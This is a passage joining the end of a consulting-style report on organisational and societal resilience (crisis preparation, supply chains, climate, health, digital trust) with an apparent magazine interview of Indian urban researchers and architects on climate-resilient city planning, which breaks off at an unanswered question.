Much the same can be said of wealth gaps based on racial inequality. In the United States, the median wealth of White families is ten times that of Black and Hispanic families, whose wealth did not essentially change between 1992 and 2016, a 24-year period. During this time, the median wealth of White families expanded by more than 50 percent. McKinsey’s research suggests that this gross disparity will cost the US economy trillions in lost consumption and investment in the next decade.

2.3 A coordinated public- and private-sector response

Crises and disruptions require a coordinated response by the public and private sectors. In fact, the world’s most pressing crises are breaking down traditional divisions in how and when public and private organizations respond. Increasingly, business, economic, and societal resilience are interlinked. A consensus has lately emerged among leaders of both sectors that neither can go it alone—the world and its organizations are too interconnected (Exhibit 3).

Exhibit 3 We strive to provide individuals with disabilities equal access to our website. If you would like information about this content we will be happy to work with you. Please email us at: McKinsey_Website_Accessibility@mckinsey.com

The general nature and extent of certain crises have been well estimated in advance. Most leaders understand that taking no action or limited actions will only result in worse outcomes. The climate crisis clearly illustrates how industry sectors, for example, must align goals and values. Many companies are moving on climate goals ahead of government regulation. The financial sector is exploring ways to measure climate resilience in valuations, recognizing that stronger responses will show in economic and shareholder outcomes.

3. A common resilience framework

A framework would provide organizations with a common language, structure, and objectives for resilience.

The current resilience discussion is still characterized by differences in interpretation and opaqueness on objectives, measurability, and areas for action. Consequently, the prerequisite for a coordinated, systematic approach to resilience is a common resilience framework. Such a framework, similar to environmental, social, and governance (ESG), would provide organizations with a common resilience language, structure, and objectives. It would also provide guidance on how to protect and enhance sustainability and inclusiveness in an environment of more frequent crises and disruptions. With the framework as a basis, organizations can enhance their mostly reactive risk management practices, harness strategic thinking, and take a more forward-looking view.

The framework would prioritize human capacity above all, while recognizing essential reskilling and upskilling requirements. It will encompass an adaptive supply chain, with technology as an enabler, and deploy financial and fiscal buffers as defensive supports within an overall active stance. Within the framework, organizations can identify preventative actions, proactive investments, and areas to deepen public–private-sector cooperation. Like ESG frameworks, the resilience framework is designed to help leaders see past the immediate bottom line and short-term financial goals.

A further affinity with ESG is that the resilience framework must be supported by assessment and measurement capabilities. These will allow leaders to understand and weigh the costs and benefits of particular resilience-building actions. Inaction will certainly be more costly than an agenda of preventative actions, but resource allocation needs to be linked to real and inclusive wealth creation—whether that is reflected in shareholder value, renewable energy growth, or the eradication of poverty.

The resilience framework will, by design, foster the cooperation of public- and private-sector organizations in supporting sustainability and inclusiveness across societies.

Finally, the resilience framework will, by design, foster the cooperation of public- and private-sector organizations in supporting sustainability and inclusiveness across societies. For companies, resilience will translate into sustainable business growth; for societies, resilience both enables and depends on meaningful economic growth, emphasizing improved quality of life, equality, and inclusiveness. Wealth creation becomes meaningful when it also elevates the standing of the most vulnerable and poorer populations, in economies of all developmental stages. Without sustained social advancement, societies are less resilient and secure. Likewise, the goal of sustainable, inclusive growth includes the protection and repair of natural environments, beyond mitigation of the effects of the climate crisis.

4. Building a resilience muscle

Invest ahead, sense early, respond immediately, and pivot to accelerate out of disruption.

Organizations usually consider resilience from a risk standpoint. Solutions are often defensive, focused on building costly buffers and risk-avoidance, approaches that tend to limit rather than support growth. The new approach to resilience goes beyond the defensive stance toward growth-oriented strategies. It focuses on creating a flexible system that orients and adapts more quickly to environmental disruptions and changes.

An active strategy is based on flexibility and speed, allowing organizations to take on more risk rather than less. In this context, buffers become a residual power to protect against uncertainties that resist more immediate answers. These considerations lead to the enhanced response depicted in Exhibit 4. The resilience muscle is strengthened through three key actions: prepare, perceive, and propel.

4.1 Prepare

Prepare is about investing ahead of large disruptions to reduce the magnitude and speed of the impact. Three types of actions can usually be taken: designing flexibility in products and processes, building buffers, and strengthening networks.

Designing flexibility usually means investing to create viable alternatives—for instance, by having multiple suppliers across several geographic regions. One example of this is an energy company that relied heavily on a proprietary trading software. In the event of a software disruption, revenue would be seriously affected. The company invested in “over-collateralizing” revenue shortfall and arranged to continue trading with its top customers in the event of a technical issue.

Building buffers means adding redundancy—for instance, by increasing safety factors in products or maintaining higher stock levels for critical resources. As an example, a government was concerned about potential disruption to the national water supply. To prepare for such an event, it identified and acquired in advance equipment and consumables essential to operations that would be difficult to acquire quickly in the event of a crisis (including those from single-source vendors). The government also built safety buffers and then identified critical high-skill roles, ensuring that these people had access to the site to maintain operations in several scenarios. This example shows a government willing to accept the higher costs of operations, building redundancy and hence resilience against extreme events.

Strengthening networks is another kind of preparation that allows organizations to build better solutions. Companies and governments are increasingly investing in improving their cybersecurity protocols, for example, and relying on their networks to share information and develop tools and capabilities to fight increasingly sophisticated threats. While each of these types of actions is conceptually simple, figuring out which of these actions to take, and for which disruption, is far from obvious, especially if the organization has not experienced a crisis of a similar nature before. It is therefore unlikely that organizations can fully prepare for crises that do not have a clear, relatively well-established solution. However, actions can be motivated if organizations grasp the immediacy of potential disruptions and envision well-established solutions.

Metrics are an essential part of the common resilience framework. Measuring the value of resilience investments can, however, be difficult. Approaches to calculating returns on investments (ROI) by expected value losses can underestimate the extent of investment needed for true resilience. A more suitable approach, used by insurers and ratings agencies to calculate risks in a business, focuses on reducing the tail value at risk. Another potentially useful measure is to identify a set of “predictably unpredictable” disruptions—those likely to occur in the next decade—and then calculate the ROI based on the overall avoided loss.

4.2 Perceive

Perceive is the part of the resilience muscle that detects a present disruption, quickly discovers its extent and implications, and defines the appropriate response.

Respond appropriately. Far too many organizations either jump the gun or move too slowly. One healthcare organization experienced a cyberattack after warning signs had been glowing red for months. The team had detected ransomware on their servers but sat on the information before escalating because the threat did not trigger the escalation criteria that had been set.

Unite risk and crisis management within a business resilience framework. A leading fast-moving consumer goods company established a business resilience framework that united traditional risk management with crisis management, business continuity, security and fraud, and insurance. It designed assets that could identify disruptions early—for example, a vending machine fitted with a temperature sensor to support operational continuity in cold supply chains.

Create an effective planning team. In addition to the ability to sense disruptions early on, organizations need an effective planning team that can use scenarios to account for uncertainty and convert it from a large list of issues to clear risk evolutions that can be categorized and acted on. The best scenarios consider a wide range of potential social, geopolitical, climate, and technological disruptions. Networks and sometimes hidden dependencies create new vulnerabilities that must be stress-tested as future evolutions are crafted.

Pressure test strategy and act on results. A global automotive original equipment manufacturer (OEM) pressure tested its strategy by assessing the impact of a hypothetical prohibition on imports of vehicles and components by a nation-state customer. The company assessed the potential results with and without resilience levers in place. When the levers were present, sales and profits regenerated two years earlier than when there were no levers. The key resilience levers were foresight (based on monitoring the country’s regulatory landscape), response capacity (quick reaction after the first announcement), and financial resilience (including a low fixed-cost base and deprioritization of selected investments).

Apply planning to supply chains. A major pharmaceutical company set up early-warning indicators for critical materials in its supply chain. It also used trigger-based plans (including automated ordering) to ensure rapidly escalating responses in case of early disruptions. The triggers were based on practical actions, including specific thresholds for escalation to senior managers or the top team.

4.3 Propel

Propel is the part of the resilience muscle that enables public- and private-sector organizations to move quickly, ensuring an effective response early in the disruption and pivoting to accelerate out of the disruption faster than peers.

Create cross-functional teams. A structure that can function in extreme uncertainty is a critical component of a successful response. A large industrial company created cross-functional teams from operations, customer support, legal, finance, and other functions. Team members developed trust in each other and were prepared to rely on each other when needed. The team was a central organ designed to allow the organization to limit uncertainty and move decisively in spite of it. The structure needs clear rules, supported by team members and norms ensuring continuity of decision making and execution.

Cut through silos. To propel organizations toward recovery, the responsible teams need to cut through silos without destroying trust. A large industrial company facing a major product failure created teams composed of people from business, finance, engineering, operations, sales, and legal. Each team focused on a single issue: one team stabilized franchise owners with capital injections; another quickly resolved the technical side of the product failure; and a third defined liquidity actions to ensure company survival and minimal impact on growth.

Pivot and move quickly. The example of Iceland in the financial crisis of 2008 is instructive. Iceland was little prepared for what was about to happen. The liabilities of its three largest banks were more than 800 percent of the national GDP—there was limited governance of sales and equity lending between banks. Iceland was therefore hit hard during the crisis (peak-to-trough GDP declines were worse than 10 percent). However, aided by its small size (315,000 people then) and, to some degree, by having its own currency, Iceland moved faster than other countries. It made a series of quick strategic moves: deleveraging household debt, driving large-scale default where needed and cleaning up firms’ overleveraged balance sheets. This brought household debt to less than 75 percent of GDP by 2015 (some neighboring countries’ debt-to-GDP ratio exceeded 120 percent), and employment rose above 2007 levels by 2013.

Public- and private-sector leaders taking an appropriately broad view of resilience encounter risks and challenges addressed in isolation—whether labor shortages, digital risks, supply chain disruptions, inflation, or inequality. Yet this approach cannot discover the many interdependencies, nor the system-wide, longer-term trends driven by climate change, societal developments, and geopolitical dynamics. A model alternative to one-off approaches is the European Commission’s Recovery Plan for Europe. The plan emphasizes the interdependencies between education, healthcare, housing, climate change, economic growth, competition, and jobs and addresses them in a holistic framework. The difficulties encountered in implementing such plans will be a measure of what it will take to bring along everyone in society.

5. Seven resilience themes that are shaping the future

Crises can only be addressed effectively if an enhanced agenda that acknowledges their interconnectedness is adopted.

Economies and societies are enduring several crises simultaneously, all of which have major humanitarian impacts and potentially long-lasting second- and third-order effects. The kinds of resilience questions urgently posed by climate change, war, and the COVID-19 pandemic have typically been addressed individually, often in isolation. This approach is no longer sufficient, if it ever was.

The enhanced resilience agenda must take a broader view, focusing on the specific challenges but also their interconnectedness. The broader view can only be obtained if the effort is based on the private and public sectors acting together to develop mutually reinforcing solutions. The World Economic Forum’s activities and initiatives addressing the challenges from current crises and disruptions can be grouped into seven resilience themes, with fundamental cross-cutting business, economic, and societal implications (Exhibit 5).

Exhibit 5 We strive to provide individuals with disabilities equal access to our website. If you would like information about this content we will be happy to work with you. Please email us at: McKinsey_Website_Accessibility@mckinsey.com

5.1 Climate, food, and energy

The United Nations Climate Change Conference (COP26) in Glasgow in 2021 drew attention to global commitments to reduce greenhouse-gas emissions. Research shows that on the path to net zero, cumulative carbon emissions to 2050 will have to be 1,000 gigatons or less if global average temperatures are to remain below 2°C above preindustrial levels. This great transformation will only be possible through the replacement at scale of the global economy’s productive asset base with nonemissive technologies. The First Movers Coalition was established to help address this challenge. Composed of a group of forward-thinking companies, this coalition was created to trigger demand to make emerging clean technologies accessible and scalable.

The UN Environment Programme is leading efforts to finance adaptation to climate change in the most vulnerable locations. Forty-five ecosystem-based adaptation projects are already under way to protect exposed populations from extreme weather and habitat loss while ensuring clean water and food.

To make real progress, deep cooperation between the public and private sectors is required on all resilience themes. Cooperative public–private efforts are needed to protect people and assets by hardening existing infrastructure, prioritizing emergency response and preparedness, and adjusting working conditions for heat events. Systems need to be made more resilient and robust by building inventories of food and raw materials and securing production by storing spare parts, strengthening supply chains, and developing alternative production sites.

Climate change is triggering more frequent and severe droughts, flooding and wildfires, damaging crop and grazing lands, and ultimately increasing global levels of hunger and food insecurity.

Climate change is triggering more frequent and severe droughts, flooding and wildfires, damaging crop and grazing lands, and ultimately increasing global levels of hunger and food insecurity. The damage is compounded by additional shocks, including the COVID-19 pandemic and inflation. Biological diversity is threatened, with scientists estimating that nearly one million species of plants and animals are headed for extinction in the coming decades. According to the United Nations, undernourishment is on the rise, harming 9.9 percent of the world population in 2020 (8.4 percent in 2019). Nearly one-third of the world’s population—2.37 billion people—do not have access to adequate food. The problem will likely worsen due to the direct and indirect effects of Russia’s war in Ukraine, as the two nations are among the world’s largest exporters of grain.

The effects of climate change on global food production can be dangerously magnified by apparently discrete disruptions. The interactions of events in the physical environment, societies, and the economy make it the more imperative that societies reduce the exposure of populations to the effects of climate change. This includes relocating assets and communities from regions where protection is too difficult while factoring climate risks into decisions on future locations.

In keeping with the goals of the Paris Agreement, many organizations and economies have committed to achieving net-zero carbon emissions as an organizing principle. McKinsey analysis indicates that financing the transition to renewable power and sustainable growth could require $100 trillion or more in capital spending, two-thirds of it in developing economies. The needed capital is beginning to form. Financial institutions are leading the effort, as demonstrated at COP26. There, the Glasgow Financial Alliance for Net Zero (GFANZ) brought together more than 450 institutions, representing $130 trillion of financial assets (40 percent of the global total), which promised to align portfolios with net-zero goals.

The difficulty in attaining these goals was starkly disclosed in the Western response to Russia’s invasion of Ukraine. The attempt to isolate Russia from the world economy creates challenges to the near-term security of Europe’s supply of crude oil, natural gas, and solid fuel (mostly coal). The conflict has contributed to global energy inflation, pushing up prices of the three types of fossil fuels, which together accounted for 83.1 percent of the world’s primary energy in 2020. Global progress on renewables, meanwhile, has been very slow, reaching a share of 4.3 percent in the 2020 energy mix.

Companies and governments have long developed business cases for the low-carbon transition, including scenarios for various speeds, accounting also for inflation and extreme price volatility in energy markets. The shortfall to a net-zero economy remains very great. Yet the continual ramping up of fossil fuel exploration, production, and delivery will accelerate global warming and promote economic dependence on energy commodities for both producers and consumers.

5.2 People, education, and organizational resilience

A fundamental requirement for ensuring sustainable, inclusive growth globally is an educated population. The United Nations’ Millennium Development Goal of sustainable development includes raising the level of education available to low-income countries and poorer and historically excluded population segments everywhere. In 2021, the United Nations estimated that one-third of young people were not receiving secondary education; 617 million youth worldwide do not have basic mathematics or literacy skills. As of 2016, 750 million adults were illiterate, two-thirds of whom were women. Furthermore, millions of refugee children were out of school completely, including nearly half the estimated total of 7.9 million refugee children in the care of the UN refugee agency. The United Nations’ education goal emphasizes the economic benefits of investments in education for all, calculating that each additional year of schooling adds 0.37 percent to GDP. The benefits of a widely educated population multiply this advantage for society and the economy, with better personal health, higher workforce productivity, and readiness for more highly skilled jobs.

Leaders in the public and private sectors will need to intensify efforts to raise education levels while building new capabilities to strengthen talent and organizational resilience.

Leaders in the public and private sectors will need to intensify efforts to raise education levels while building new capabilities to strengthen talent and organizational resilience. Millions of workers in many job categories lost their jobs during the pandemic, while millions of others left their positions. Hardest hit were women workers, on whom family-care obligations disproportionately fell.

In the United States in the fourth quarter of 2021, for example, the labor force was smaller by three million people than it had been in February 2020, with two million fewer women. According to the International Labour Organization, the pandemic-driven recession resulted in a 4.2 percent drop in women’s employment, compared with a 3 percent drop for men. This difference subsequently moderated in many developed economies but remained in Latin American countries such as Brazil and Mexico.

A complicating issue is that preexisting trends in remote work, e-commerce, and automation accelerated during the pandemic, putting some workers in higher demand but displacing many more. In developed and developing nations alike, employers are finding it difficult to hire enough specialized talent to expand. Tech workers, for example, are in high demand in economies large and small, a shortage that may be the best indication of the kind of high-level reskilling organizations need for the economies of the future. Furthermore, IT workers and cybersecurity professionals are now especially sought after, as they are crucial to the rising demands of remote work and building organizational resilience. The World Economic Forum’s Insurance and Asset Management Industry Action Group has developed an organizational resilience framework for businesses, recognizing the new reality that resilience has risen to the top of the list of business considerations after the unprecedented disruptions of the COVID-19 pandemic.

5.3 Healthcare

The Partnership for Health System Sustainability and Resilience is a global collaboration of the London School of Economics, the World Economic Forum, and AstraZeneca. Its purpose is to ensure that health systems can withstand future crises. The Partnership’s study of many health systems revealed that most were not adequately prepared to cope with the shock of the COVID-19 pandemic. Many were not adequately financed, given the persistent influence of the banking crisis of 2009 on public-sector finances.

Other worrying aspects were also at play: governance systems were shown in many cases to lack leadership and clear strategies. In terms of COVID-19 pandemic responses, perhaps this is an expected outcome, given that many systems are still responding in “firefighting” mode. However, it also highlights that policies for existing strategies are not clearly defined and implemented. In some countries, the chains of command are unclear when facing a systemic shock, and tensions between central and local authorities can impede responsiveness. During the pandemic, some countries facing workforce shortages lacked workforce planning, while workplace well-being was sometimes a secondary consideration. In some countries, investment in health system capital was limited in places, including in digital health and health technology assessment. Within healthcare systems described as “integrated” (such as the National Health Service in the United Kingdom), a lack of coordination was found at various levels and across different aspects of service delivery.

Building on the pandemic’s lessons, governments and healthcare providers can revitalize healthcare systems and improve the state of global public health. Health crisis preparation and response can be improved at the national and regional levels. Crisis protocols should be adjusted and crucial supplies stockpiled, for example. Among the improvement areas identified by the Partnership for Health System Sustainability are government financing models for healthcare systems, digital innovation, distributed and virtual care, regulatory harmonization for new technology, investment in preventative care, workforce reskilling, and changes in incentive structures to pay for value-based outcomes.

International resilience to future health threats can be strengthened with improved monitoring, greater transparency, better response coordination, and clearer communication. The pandemic has also highlighted, and exacerbated, mental-health issues, whose scale and impact must be better acknowledged and addressed, especially with measures accessible to all population segments. Health research programs to eradicate diseases and deliver care can be based on government and private-sector cooperation, modeled on the COVID-19 vaccine efforts.

Healthcare professionals, it must be recognized, are often working at their limit in the pandemic, many in substandard conditions with inadequate equipment. Governments and providers can improve the conditions of healthcare work, while building a flexible workforce of the future, with skills optimized for cross-country and cross-sector cooperation to meet demand surges during crises.

5.4 Sustainable economic development

For developing economies, resilience-building is a form of economic advancement, benefiting businesses, government, and society while reducing historical vulnerabilities. Massive investment is needed, but many local projects can be completed in increments at a relatively low cost. Primary objectives must include improvements in housing, agricultural diversity and food supply, water infrastructure, and sewerage. Furthermore, due to income loss during the pandemic, the number of people without access to energy in the global south increased. This was the first such increase in more than a decade and highlights the continued energy-access gap that must be closed.

Parallel efforts are also needed to improve education and technical training, and to establish and expand digital infrastructure, as digital inclusiveness will help increase the adaptive capacities of businesses and society as a whole. Initial resilience activities can act as catalysts to engage the private sector to magnify sustainable, inclusive growth. Proper planning is essential to assess the economy and ensure that programs and initiatives support sustainable growth. Undertakings that involve communities and community organizing are especially important, as stronger societal engagement is needed to overcome the many social challenges.

5.5 Trade and supply chain

Global economic interdependencies have deepened for decades, resulting in a steep incline in world trade volumes. Globalized production and supply, aided by many free trade agreements concluded in the late-20th and early-21st centuries, allowed economies and businesses to develop strong international relationships. While limits to these new relationships were posed by geopolitical friction, the COVID-19 pandemic revealed other vulnerabilities. As borders were closed and mobility was restricted in efforts to control the spread of the virus, supply chains were disrupted, often radically. Customer demand experienced some volatility, but with shifts (such as the accelerating use of digital channels), it soon recovered. Supply chains, however, continue to struggle. Just-in-time practices, used in many sectors to minimize waste by keeping supply inventories low, were put to the test. Limited stocks were quickly exhausted.

In response, manufacturers improvised. Some established dedicated teams to develop supply-and-demand intelligence, combining data on the supply chain and supplier commitments. Some began to reconsider, at least in part, just-in-time delivery and maintenance of low stock levels along their value chains. Some governments, concerned about dependence on single suppliers and distant countries for vital needs, began to push for more regional and diverse sourcing.

The effects of the present pandemic-related supply shocks will continue to appear as a result of trade-policy changes, workforce scarcity, and inflation. While there is no such thing as a disruption-proof supply chain, governments and companies can cooperatively work toward a flexible design.

The solutions will likely combine several elements: a limited just-in-case approach with redesigned inventory holding; an expanded supply base, including diverse regions and routes; vertical integration where appropriate; and radical transparency across supplier tiers and new operating models and partnerships. Governments can help by establishing connections across segregated data, using accelerated regulatory approvals to advance adoption and innovation (such as 3-D printing for flexible production close to point of use). Collaboration and coordination by the public and private sectors is needed to target investment and avoid duplication of effort.

5.6 Digital resilience, trust, and inclusion

Many global companies and financial institutions sustained operations during the COVID-19 pandemic through digital enablement of remote-working arrangements. The World Economic Forum cites research suggesting that the digital economy accounts for 15 percent of global GDP today and could expand to 26 percent by 2040. Digital inclusion is thus a growth imperative. It means improving digital infrastructure and connecting wider populations and heretofore excluded segments. The Forum-sponsored EDISON Alliance for Digital Inclusion seeks to create affordable and accessible digital opportunities for all by 2025 through an unprecedented collaboration between the information and communications technology community and other critical sectors of the economy.

In the next ten years, more innovation is expected than at any other time in history, as technology reshapes healthcare, mobility, materials sciences, and energy production. Accelerating developments in such technologies as cloud computing, robotics, process automation, and the industrial Internet of Things are already affecting many aspects of productive activity.

Sidebar A call to action: The Resilience Consortium The World Economic Forum Resilience Consortium comprises leaders from the public and private sectors committed to working together to build resilience globally, across regions, economies, and industries. It is guided by the following objectives: Develop a common resilience framework for public- and private-sector organizations that can help them achieve more sustainable, inclusive growth. The common resilience framework provides the basis for developing stronger institutional capabilities—the elements of the new resilience muscle.

Develop a shared understanding of the drivers of resilience and a prioritized resilience agenda to align public- and private-sector approaches and efforts. The prioritized agenda can also support current initiatives from the perspective of the wider resilience framework.

Identify potential public–private partnerships to build more resilient societies and economies and take common action to support sustainable, inclusive growth. Prioritize investments and scale solutions that help mitigate risks for future shocks. Use leadership positions in the public and private sectors to advocate for a cultural change in organizations and societies as society moves away from narrowly focused, short-term responses toward long-term value creation. The Resilience Consortium is committed to shaping a new resilience agenda based on adaptability and decisiveness. Now is the time for action, as the policy decisions and financial commitments made today will determine the future course of the planet, economies, and societies. A shared, comprehensive view of resilience and its drivers will help policy makers and business leaders recognize the opportunities and act to lay the foundations of sustainable and inclusive, long-term global growth.

These developments will require more integrated cybersecurity measures to minimize risks and improve resilience. This means having the right cybersecurity and other operational processes, plans, and mechanisms in place to ensure business continuity during a cyberincident. While cyberresilience within enterprises is vital, the scale of the resilience crisis in systemic critical infrastructure points to an even more significant challenge. The resilience of sectors that are most crucial to societal and economic security and stability should therefore be a priority for public and private actors.

In light of these developments and directional signals, digital trust and digital inclusivity grow in importance. Many nations and companies want to achieve digital inclusivity, a goal requiring sufficient funding to reach across society. Investments are needed in digital education, equipment, and infrastructure so that poorer nations and excluded populations can share in the prosperity of the digital ecosystem. Digital trust means that companies and governments make their systems and data secure against cyberthreats using the most advanced approaches. Organizations must reflect the values of wider society, safeguarding personal data while ensuring reliable services. Many companies have yet to discover the competitive advantage of being a leader in digital trust. Developing and promoting digital trust, however, will be key to transforming security into a value proposition and securing the wider domain. Unless users can trust digital systems, the advantages of the digitized economy will be lost.

5.7 Finance and risk capacity

The financial sector will have an enormous role in building a resilient, sustainable future. The world economy demonstrated financial resilience through the pandemic, as companies relied on access to funding, including historic levels of government support. The importance of capital buffers at the company level and fiscal and monetary capacity in the public sector has not diminished, their extent being the subject of continuous debate, especially since the return of inflation. By far the financial sector’s greatest responsibility in the coming decades, and largest growth opportunity, is in financing the transition to a low-carbon future. Most of the investment will come from the private sector, with the public sector playing an important role in mitigating risk for renewable energy projects. Furthermore, most of the expenditure is expected to take place in emerging economies. The Forum launched Financing the Transition to a Net Zero Future in 2020, an initiative to mobilize capital for the breakthrough technologies needed to support the transition to a low-carbon future.",Livelihood Crisis,2022-06-07 14:30:06

Seven years ago, India decided to make concerted efforts to make its cities smart and sustainable. The SMART City Mission created an aspirational vision of a city with tall buildings, steel glasses, and concrete walkways. But embedded within these plans was a dissonance between planning objects and climate change realities: attempts of beautification failed to account for rising temperatures and depleting forest cover. By one estimate, 90% of the buildings under construction today pay little attention to India’s climate—locking in increased heat risk for decades to come, which would worsen the way millions of people experience heat.

Just how resilient are Indian cities to the climate crisis? And how do we reimagine the framework within which we think of our cities? To understand this, The Swaddle’s Saumya Kalia spoke to Seema Mundoli, an urban cities researcher at Azim Premji University who researches aspects of urban sustainability; Chitra Vishwanath, a Bengaluru-based architect who weaves ecology into her designs; and Chennai-based Benny Kuriakose who works at the intersection of architecture and conservation.

The Swaddle: What does it mean for a city to be climate resilient?

Chitra Vishwanath: The most popular answer to this question is that the city is climate-resilient when it can absorb future shocks. To us, in India, added input will be that the city absorbs the shocks with equity and empathy in place. Urban India will house 40% of the Indian population by 2030. So while cities are vehicles for prosperity, they also foster deep inequality. Climate shocks will exacerbate the inequalities since the land and access to water will be highly contested resources.

Seema Mundoli: At present, whenever there is an unprecedented event like an urban flood or a drought, which have both been happening with increasing frequency across cities in India, there is a complete collapse of all services and infrastructure. There are also lasting impacts of floods in terms of property destroyed and lives lost, with more vulnerable sections often being the worst affected. The resilience of cities to me, then, is the ability to both absorb these kinds of shocks but at the same time develop some form of adaptation that will be useful in the long term.

For example, say in the case of the Chennai floods of 2015, and the severe water scarcity in 2019 … the crux of both the problems lies in how the city has treated its water bodies and wetlands. Seema Mundoli, urban cities researcher

Protecting this blue infrastructure can ensure that floods are not as severe as before with the wetlands soaking in excess rain, and also replenishing groundwater at the same time. The worst affected by either floods or water scarcity are informal settlements. So, any action to build resilience will have to use their experiences, knowledge, and impacts suffered as the baseline.

TS: Is India’s architecture prepared to deal with extreme weather conditions, like heat waves and floods? Why or why not?

Benny Kuriakose: Disasters are on the increase. We think about disasters only when it comes and we give importance to relief measures. But to become resilient means we need more long-term planning, which is missing in our present circumstances; what we need is plans which will provide long-term benefits. It is during the last century that the thinking developed, by which we need not design according to the climate since we can do air-conditioning, etc. We were trying to emulate the West because we thought that what they are doing is correct. But now it is very clear that this is adding oil to the burning climate change issue.

CV: In 2013, Ahmedabad floated the Heat Action Plan. This was felt to be a necessity after the experience of the summer of 2010: 1,000 people died in one month and 100 neonatal deaths occurred in a day. The city took notice of this and developed a plan. The plan has had its successes and has also been followed up by other states and cities in the country, but it is largely a medical advisory and does not take into account city planning.

The architecture of buildings per se is a small player – the larger being the architecture of the city planning itself. City planning needs to be based on the sun path. In most cities of India, we need shade at the level of pedestrian movement, while we need the sun to harvest energy. Building glass facades do not absorb ultraviolet rays to the interior but reflect it back to the outside, further harming the environment. This calls for regulating building facades so that they do not contribute to the urban heat island effect [when the temperature is higher in an area or region than in the surrounding]. Overall, this is a scenario where the comfort of the inside is at the cost of discomfort outside. At the moment obfuscated by-laws based on economic considerations are promulgated and not ecological sense. This has to change and change fast. The top-down approach needs to change and through decentralization decisions on eco-systems should be taken.

There needs to be a paradigm shift in the way we think of nature in cities in our urban plans—not as an “also needed” for cities, but as being the core of making cities climate-friendly. Seema Mundoli, an urban cities researcher

SM: While traditional materials for housing may be more climate-friendly, they will not be able to support the scale of urbanization projected. Cities will still need high rises built with concrete and other such construction material that may not be the best in terms of protecting from heat waves or floods. I do feel that the problem is not just with the material used for construction; it is where the construction has happened—over a lake, a wetland, and so on. So, more importantly, the focus should be on overall city design – what are we doing away with in urban plans, that ends up exacerbating heat waves or floods? The answer is simple – the green, blue, and open spaces that are critical for maintaining the microclimate of cities.

TS: Our current urban planning banks on the Smart Cities Mission. What is lost/gained with this objective?

[The government of India has spent more than Rs. 2 crores in building 5,151 projects across 100 cities. It was launched in June 2015, with the objective of making cities sustainable and preparing for extreme weather conditions.]

CV: Let’s understand SMART in its mnemonic sense. SMART is an acronym that stands for Specific, Measurable, Achievable, Realistic, and Timely. But SMART Cities are not yet taking cognizance of ecology in its fold. They… are placing underground cables, making beautiful (ostensibly in some minds) parking, and undertaking some restoration projects. The tall steel and glass objects are aspirations of the people with poor vision and imagination. We are suffering because of such implementation.

SM: Frankly, it [the scheme] is anything but smart! The vision of the Smart Cities Mission (SCM) comes at the cost of the ecological landscape of cities and ideas of inclusivity. Take any city in the SCM, you will see that there is an emphasis on beautification that extends to parks, waterfronts, lakes, and so on. This beautification is leading to two things—one is more concretization of the already limited natural spaces in the cities and also, even worse, the exclusion of local communities who used these spaces traditionally. [Out of the seven smart cities in Bengaluru], each one of them has ecological and social justice concerns, be it the plans for Cubbon Park in Bengaluru or the waterfront along the Tungabhadra river in Shimoga. We are gaining the false promise of infrastructure and services and losing out on the critical ecological services while making spaces in cities more unequal.

BK: Unfortunately, creating modern skyscrapers in our cities is being equated to development. We have to look at the long-term benefits. This is where many of our projects fail. What we need is not blind development. What is absolutely required can be done. Neglecting our historic cities and creating glass buildings that can go anywhere is not smart growth.

TS: How does a city’s infrastructure impact people’s experiences of extreme weather?

CV: Heat and flooding are two extreme conditions Indian cities will face. Architecture has a huge part to play to mitigate and make the buildings resilient to these shocks. But, they end up adding to the heat island and urban flooding of the city while making the work/living spaces cooler and safe. Architecture has to deal with the contradiction placed by urban planning – it is in a rather tough situation. For example, if the city keeps digging its roads because it has not planned its infrastructure in a comprehensive manner, or vested interests do a bad job on the roads, the buildings have to adopt noiseless and cool interiors. Glass and air-conditioning then become the answer. If by-laws prioritize density, obviously open spaces and trees are sacrificed in the greed to achieve higher saleable areas. A lack of reliable public transportation and dependencies on personal vehicles further lead to air/noise pollution and congestion. Slum Rehabilitation is done with badly ventilated and congested buildings which leads to poor investing heavily in energy-intensive ACs and also suffering bad health.

Architecture alone cannot be a villain; we need an enlightened ecosystem-based approach. The heat and climate action plans need to become granular and be part of the by-laws.

SM: The kind of infrastructure and architecture in cities does affect the temperature in cities. But considering the scale of urbanization … we are left with few options when it comes to the choice of materials for infrastructure. But what we do have a choice about is how we can design to reduce dependence on air conditioners and other high-carbon-footprint technologies, go for more natural ventilation and, of course, protect as well as enhance the existing green spaces in cities.

BK: This is explained through the well-researched phenomenon of the “heat island effect.” The temperature can go up by 3 degrees or even more in certain areas of the city. The fusion of modern techniques with traditional ideas is what we have been trying to perfect over the years. The wide regional variations within a state in India are something we must learn to appreciate and learn from, and adapt to our contemporary ways of life. We recognize that varied materials, climate, and culture in India are sufficient to provide us without varied ways of designing and constructing unique sustainable buildings – we wish to challenge the way the modern construction industry operates.

TS: The latest IPCC report shows how smart urban planning can mitigate the effects of climate change. Why is it important to make architecture more cognizant of climate realities, especially in India?

Today, buildings are responsible for more than 40% of global energy used and as much as one-third of global greenhouse gas emissions, both in developed and developing countries. Chitra Vishwanath, Bengaluru-based architect

CV: I maintain that building decisions are not solely villains here and it is important to look at urban by-laws. But let us discuss buildings – a lot can be attempted here. There are two aspects: construction material and people constructing the buildings. We in India need to build a lot, especially housing and social infrastructures like schools and community spaces. All these need not be towers and they can be built with local materials. We need a local material database with information on the various environmental implications of their use and meaning. These buildings should be a repository of local skills and enhance the same through new learning. Urban migration is one part of the climate crisis … but the underbelly of the infrastructure is the people who make it and much effort should be paid to make construction jobs decent work. Construction work should be safe, healthy, and fair-waged – it is not so today. This keeps the vicious cycle of poverty growing. If we do not address the human issues, the hardware of infrastructure will remain a mirage.

BK: The building industry contributes a significant portion to the global warming crisis. It is very important that the profession realizes this issue. The solution is not to follow the Western models, but to look within us and toward our vernacular architecture. The danger is around the corner and it is important that we act swiftly. We need to look at this now and plan for the changes which might be happening after 50 years.

SM: India is highly vulnerable to climate change, and we should worry because we also have a large population and a large population of vulnerable groups. The magnitude with which a climate event affects the vulnerable is many times more than it does a well-to-do person who has the networks and resources to bounce back. If we do not want climate refugees, we need to ensure that we are able to invest in research and development of infrastructure that increases the resilience of these vulnerable groups. We need a lot more thinking to be done about how urban plans, especially infrastructure, are designed to address climate change impacts. Architecture and civil engineering colleges across the country need to include in their programs courses on climate realities and sustainability challenges.

TS: If development plans were to meet the realities of the climate crisis, what would city infrastructure and planning look like?

